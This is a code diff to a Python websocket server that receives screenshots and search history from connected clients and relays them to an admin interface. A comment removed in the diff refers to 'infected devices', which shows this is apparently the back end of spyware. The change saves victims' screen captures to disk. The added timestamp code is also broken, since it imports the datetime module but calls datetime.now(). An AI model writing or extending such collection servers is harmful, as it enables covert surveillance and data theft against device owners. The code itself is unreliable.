@@ -1,4 +1,5 @@
 import base64
+import datetime
 import json
 import asyncio
 from aiohttp import web
@@ -6,7 +7,9 @@ import websockets
 import logging
 import os
 
-
+# Directory to store screenshots
+SCREENSHOT_DIR = "screenshots"
+os.makedirs(SCREENSHOT_DIR, exist_ok=True)  # Create directory if it doesn't exist
 connected_clients = set()
 screenshot_store = []
 
@@ -41,31 +44,33 @@ async def handle_client(websocket):
                 logger.info(f"Received command: {command}")
                 
                 if command == "screenshot":
-                    # Decode Base64 screenshot and save it to the store
-                    screenshot_store.append(payload)  
+                    # Decode Base64 payload and save it to a file
+                    screenshot_data = base64.b64decode(payload)
+                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                    filename = f"screenshot_{timestamp}.png"
+                    file_path = os.path.join(SCREENSHOT_DIR, filename)
 
-                    #Limit the number of stored screenshots
-                    if len(screenshot_store) > 10:  
-                        screenshot_store.pop(0)
+                    with open(file_path, "wb") as f:
+                        f.write(screenshot_data)
+                    logger.info(f"Screenshot saved to {file_path}")
 
-                    # Broadcast all screenshots to the admin interface
+                    screenshot_list = [
+                        {"filename": f, "timestamp": f.split("_")[1].split(".")[0]}
+                        for f in os.listdir(SCREENSHOT_DIR)
+                    ]
                     admin_message = {
                         "command": "screenshot_update",
-                        "payload": screenshot_store  
+                        "payload": screenshot_list,
                     }
                     await broadcast(admin_message)
 
                 elif command == "search_history":
                     response = {"command": "search_history"}
                     save_search_history(payload)
-
-                    # Broadcast the search history to the admin interface (this is kinda meh implementation because it also broadcasts to infected devices, 
-                    # should work for now but ill look into it at some point)
                     await broadcast({"command": "search_history"})
 
                 else:
                     response = {"command": "error"}
-                    # Send the JSON response back to the client
                     await websocket.send(json.dumps(response))
                     logger.info(f"Sent message to client: {response}")
                 
